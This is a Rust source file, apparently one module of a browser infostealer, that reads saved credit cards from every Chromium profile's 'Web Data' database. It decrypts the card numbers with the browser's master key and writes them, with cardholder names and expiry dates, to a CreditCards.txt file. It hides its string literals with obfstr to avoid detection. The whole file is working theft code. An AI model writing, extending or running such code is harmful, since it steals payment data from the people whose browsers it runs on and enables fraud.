use alloc::boxed::Box;
use sqlite::{DatabaseReader, TableRecord, TableRecordExtension};
use alloc::string::{String, ToString};
use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use sqlite::read_sqlite3_database_by_bytes;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use crate::chromium::Browser;
use crate::CreditCard;
use obfstr::obfstr as s;
use utils::browsers::chromium::decrypt_data;

const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
const CREDIT_CARDS_EXPIRATION_MONTH: usize = 2;
const CREDIT_CARDS_EXPIRATION_YEAR: usize = 3;
const CREDIT_CARDS_CARD_NUMBER: usize = 4;
const CREDIT_CARDS_USE_COUNT: usize = 7;

pub(super) struct CreditCardsTask {
    browser: Arc<Browser>
}

impl CreditCardsTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for CreditCardsTask {
    parent_name!("CreditCards.txt");
    
    unsafe fn run(&self, parent: &Path) {
        let mut credit_cards: Vec<CreditCard> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_credit_cards(profile, &self.browser.master_key))
            .flat_map(|v| v.into_iter())
            .collect();
        
        if credit_cards.is_empty() {
            return
        }
        
        credit_cards.sort();
        credit_cards.dedup();
        
        credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
        
        let _ = credit_cards
            .iter()
            .map(|credit_card| credit_card.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }
}

fn get_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard>> {
    let cookies_path = profile / s!("Web Data");
    let bytes = cookies_path.read_file().ok()?;

    let db = read_sqlite3_database_by_bytes(&bytes)?;
    let table = db.read_table(s!("Credit_cards"))?;

    let cards = table
        .filter_map(|record| extract_card_from_record(&record, master_key))
        .collect();

    Some(cards)
}

fn extract_card_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<CreditCard> {
    let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?.to_owned();
    let expiration_month = record.get_value(CREDIT_CARDS_EXPIRATION_MONTH)?.as_integer()?;
    let expiration_year = record.get_value(CREDIT_CARDS_EXPIRATION_YEAR)?.as_integer()?;
    let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
    
    let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
    let card_number = unsafe { decrypt_data(encrypted_card_number, master_key) }?;
    
    Some(CreditCard {
        name_on_card,
        expiration_month,
        expiration_year,
        card_number,
        use_count
    })
}